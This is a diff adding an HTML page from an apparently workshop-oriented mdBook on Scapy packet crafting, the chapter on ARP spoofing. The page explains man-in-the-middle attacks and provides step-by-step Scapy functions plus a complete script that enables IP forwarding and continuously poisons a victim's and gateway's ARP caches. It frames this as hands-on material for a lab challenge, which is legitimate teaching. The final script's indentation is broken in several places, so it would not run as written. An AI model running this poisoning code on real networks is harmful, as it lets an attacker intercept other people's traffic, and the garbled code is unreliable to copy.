@@ -1,0 +1,354 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>ARP Spoofing - The Art of Packet Crafting with Scapy</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var html = document.querySelector('html');
+            var sidebar = null;
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><li class="part-title">The Art of Packet Crafting with Scapy</li><li class="chapter-item expanded "><a href="../intro/index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../intro/workshop-overview.html"><strong aria-hidden="true">1.1.</strong> Workshop Overview</a></li><li class="chapter-item expanded "><a href="../intro/license.html"><strong aria-hidden="true">1.2.</strong> License</a></li><li class="chapter-item expanded "><a href="../intro/bigger_picture.html"><strong aria-hidden="true">1.3.</strong> Bigger Picture</a></li><li class="chapter-item expanded "><a href="../intro/trainers.html"><strong aria-hidden="true">1.4.</strong> Trainers</a></li><li class="chapter-item expanded "><a href="../intro/disclaimer.html"><strong aria-hidden="true">1.5.</strong> Disclaimer</a></li><li class="chapter-item expanded "><a href="../intro/feedback.html"><strong aria-hidden="true">1.6.</strong> Feedback</a></li></ol></li><li class="chapter-item expanded "><a href="../setup/index.html"><strong aria-hidden="true">2.</strong> Lab Setup</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../setup/mysterious_boxes.html"><strong aria-hidden="true">2.1.</strong> Mysterious Boxes</a></li><li class="chapter-item expanded "><a href="../setup/network-hunt.html"><strong aria-hidden="true">2.2.</strong> Network Hunt</a></li></ol></li><li class="chapter-item expanded "><a href="../networking/index.html"><strong aria-hidden="true">3.</strong> Networking Basics</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../networking/layers.html"><strong aria-hidden="true">3.1.</strong> Network Layers</a></li><li class="chapter-item expanded "><a href="../networking/socket-interface.html"><strong aria-hidden="true">3.2.</strong> Socket Interface</a></li><li class="chapter-item expanded "><a href="../networking/packet-headers.html"><strong aria-hidden="true">3.3.</strong> Packet Headers</a></li><li class="chapter-item expanded "><a href="../networking/arp.html"><strong aria-hidden="true">3.4.</strong> ARP Protocol</a></li></ol></li><li class="chapter-item expanded "><a href="../python/index.html"><strong aria-hidden="true">4.</strong> Python</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../python/python_concepts.html"><strong aria-hidden="true">4.1.</strong> Python Concepts</a></li></ol></li><li class="chapter-item expanded "><a href="../scapy/index.html"><strong aria-hidden="true">5.</strong> Scapy</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../scapy/scapy_intro.html"><strong aria-hidden="true">5.1.</strong> Scapy Intro</a></li><li class="chapter-item expanded "><a href="../scapy/scapy_modes.html"><strong aria-hidden="true">5.2.</strong> Scapy Modes</a></li><li class="chapter-item expanded "><a href="../scapy/exploring_scapy.html"><strong aria-hidden="true">5.3.</strong> Exploring Scapy</a></li><li class="chapter-item expanded "><a href="../scapy/creating_packets.html"><strong aria-hidden="true">5.4.</strong> Creating Packets</a></li><li class="chapter-item expanded "><a href="../scapy/inspecting_packets.html"><strong aria-hidden="true">5.5.</strong> Inspecting Packets</a></li><li class="chapter-item expanded "><a href="../scapy/send_revieve_packets.html"><strong aria-hidden="true">5.6.</strong> Send & Recieve Packets</a></li><li class="chapter-item expanded "><a href="../scapy/import_export_data.html"><strong aria-hidden="true">5.7.</strong> Import & Export Data</a></li><li class="chapter-item expanded "><a href="../scapy/sniffing.html"><strong aria-hidden="true">5.8.</strong> Sniffing</a></li></ol></li><li class="chapter-item expanded "><a href="../recon/index.html"><strong aria-hidden="true">6.</strong> Network Recon</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../recon/host_discovery.html"><strong aria-hidden="true">6.1.</strong> Host Discovery</a></li><li class="chapter-item expanded "><a href="../recon/service_discovery.html"><strong aria-hidden="true">6.2.</strong> Service Discovery</a></li><li class="chapter-item expanded "><a href="../recon/os_detection.html"><strong aria-hidden="true">6.3.</strong> OS Detection</a></li><li class="chapter-item expanded "><a href="../recon/promisc.html"><strong aria-hidden="true">6.4.</strong> Detect Promisc Mode</a></li><li class="chapter-item expanded "><a href="../recon/pcap_analysis.html"><strong aria-hidden="true">6.5.</strong> PCAP Analysis</a></li><li class="chapter-item expanded "><a href="../recon/traceroute.html"><strong aria-hidden="true">6.6.</strong> Traceroute</a></li></ol></li><li class="chapter-item expanded "><a href="../attacks/index.html"><strong aria-hidden="true">7.</strong> Network Attacks</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../attacks/cam_overflow.html"><strong aria-hidden="true">7.1.</strong> CAM Overflow Attack</a></li><li class="chapter-item expanded "><a href="../attacks/arp_spoofing.html" class="active"><strong aria-hidden="true">7.2.</strong> ARP Spoofing</a></li></ol></li><li class="chapter-item expanded "><a href="../libraries/index.html"><strong aria-hidden="true">8.</strong> Libraries</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../libraries/netaddr.html"><strong aria-hidden="true">8.1.</strong> netaddr</a></li><li class="chapter-item expanded "><a href="../libraries/netifaces.html"><strong aria-hidden="true">8.2.</strong> netifaces</a></li></ol></li><li class="chapter-item expanded "><a href="../exercises/index.html"><strong aria-hidden="true">9.</strong> Exercises</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../exercises/misc.html"><strong aria-hidden="true">9.1.</strong> Misc Exercises</a></li><li class="chapter-item expanded "><a href="../exercises/network_hunt.html"><strong aria-hidden="true">9.2.</strong> Network Hunt</a></li></ol></li><li class="chapter-item expanded "><a href="../misc/references.html"><strong aria-hidden="true">10.</strong> References</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">The Art of Packet Crafting with Scapy</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="arp-spoofingmitm"><a class="header" href="#arp-spoofingmitm">ARP Spoofing(MiTM)</a></h1>
+<p>The hands-on for this is while solving the &quot;Network Hunt&quot; challenge.</p>
+<blockquote>
+<p><strong>Messing with ARP</strong></p>
+<p>ARP attacks can potentially mess your LAN configuration. Be very cautious about testing these attacks/scripts in production environment(or in any network for that matter)</p>
+<p>Fortunately any potential mis-configuration will be corrected to orignal state in few minutes. If you do happen to mess up your LAN, take a walk, come back several minutes later, pretend that the network was still working when you left.</p>
+</blockquote>
+<p>In common hub networks all traffic can be seen by all hosts whose NICs (network interface card) are in promiscuous mode, but things are a bit different on switched networks.</p>
+<p>A switch looks at the data sent to it and tries to only forward packets to its intended recipient based on the MAC address.</p>
+<p>Switched networks are more secure and help speed up the network by only sending packets where they need to go.</p>
+<p>There are ways around switches though. Using a program like Arpspoof (part of the Dsniff package), we can lie to other machines on the local area network and tell them we have the IP they are looking for, thus funneling their traffic through us.</p>
+<p><img src="../imgs/mitm.png" alt="arp-spoofing" /></p>
+<p>In the above image, the attacker is telling Alan’s box that he has the IP that corresponds to Brian’s box and vice versa. By doing this the attacker receives all network traffic going between Alan and Brian. Once the attacker has ARP Spoofed his way between two nodes he can sniff the connection. By ARP Spoofing between a computer and the LAN’s gateway an attacker can see all the traffic the computer is sending out and receiving.</p>
+<h2 id="step-1---ip-forwarding"><a class="header" href="#step-1---ip-forwarding">Step 1 - IP forwarding</a></h2>
+<p>Make sure that the kernel IP forwarding is enabled, otherwise our machine will drop all traffic between the hosts we are trying to sniff, causing a denial of service.(“IP forwarding” is a synonym for “routing.” It is called “kernel IP forwarding” because it is a feature of the Linux kernel.)</p>
+<pre><code>&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.system('echo 1 &gt; /proc/sys/net/ipv4/ip_forward')           # enable kernel IP forwarding
+&gt;&gt;&gt; os.system('echo 0 &gt; /proc/sys/net/ipv4/ip_forward')           # disable kernel IP forwarding
+</code></pre>
+<p>More on kernel IP forwarding: <a href="http://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding">http://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding</a></p>
+<h2 id="step-2---gather-mac-addresses"><a class="header" href="#step-2---gather-mac-addresses">Step 2 - Gather MAC addresses</a></h2>
+<p>In order to create our ARP responses, we’ll need the victim and router MAC addresses. We can do this by making ARP requests and returning the result.</p>
+<pre><code>def get_mac(IP):
+    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+    for snd,rcv in ans:
+        return rcv.sprintf(r&quot;%Ether.src%&quot;)
+</code></pre>
+<h2 id="step-3---tricking-the-targets"><a class="header" href="#step-3---tricking-the-targets">Step 3 - Tricking the Targets</a></h2>
+<p>In this step we are tricking eachmachine into thinking that the other party is our machine. ARP reply to each of the targets telling them that we are the other target, placing ourselves in between them.</p>
+<pre><code>def trick(gm, vm):
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
+</code></pre>
+<p>Step 4 - Un-doing the attack/ Re-ARPing</p>
+<p>It’s not enough to trick the machines, once our attack is over, we need to re-assign the target’s addresses so they know where to send their information properly. If we don’t do this than it will be very obvious that something has happened.</p>
+<pre><code>def reARP():
+    print &quot;\n[*] Restoring Targets...&quot;
+    victimMAC = get_mac(victimIP)
+    gatewayMAC = get_mac(gatewayIP)
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
+        disable_ip_forwarding()
+    print &quot;[*] Shutting Down...&quot;
+    sys.exit(1)
+</code></pre>
+<h2 id="final-script"><a class="header" href="#final-script">Final script</a></h2>
+<pre><code>from scapy.all import *
+import sys
+import os
+import time
+
+
+def help_text():
+    print(&quot;\nUsage:\n python hd_tcp_syn.py network_range\n&quot;)
+    sys.exit()
+
+def enable_ip_forwarding():
+    print &quot;\n[*] Enabling IP Forwarding...\n&quot;
+    os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+
+def disable_ip_forwarding():
+    print &quot;[*] Disabling IP Forwarding...&quot;
+    os.system(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+
+def get_mac(IP):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+    for snd,rcv in ans:
+        return rcv.sprintf(r&quot;%Ether.src%&quot;)
+
+def reARP():
+
+    print &quot;\n[*] Restoring Targets...&quot;
+    victimMAC = get_mac(victimIP)
+    gatewayMAC = get_mac(gatewayIP)
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
+    disable_ip_forwarding()
+    print &quot;[*] Shutting Down...&quot;
+    sys.exit(1)
+
+def trick(gm, vm):
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
+
+def mitm():
+    try:
+        victimMAC = get_mac(victimIP)
+    except Exception:
+        disable_ip_forwarding()
+        print &quot;[!] Couldn't Find Victim MAC Address&quot;
+        print &quot;[!] Exiting...&quot;
+    sys.exit(1)
+    try:
+        gatewayMAC = get_mac(gatewayIP)
+    except Exception:
+        disable_ip_forwarding()
+        print &quot;[!] Couldn't Find Gateway MAC Address&quot;
+    print &quot;[!] Exiting...&quot;
+        sys.exit(1)
+    print &quot;[*] Poisoning Targets...&quot;    
+    while 1:
+    try:
+        trick(gatewayMAC, victimMAC)
+            time.sleep(1.5)
+    except KeyboardInterrupt:
+        reARP()
+        break
+
+if __name__ == '__main__':
+    if len(sys.argv) &lt; 2:
+        help_text()
+    interface = sys.argv[1]
+    victimIP = sys.argv[2]
+    gatewayIP = sys.argv[3] 
+    enable_ip_forwarding()
+    mitm()
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../attacks/cam_overflow.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next" href="../libraries/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../attacks/cam_overflow.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next" href="../libraries/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
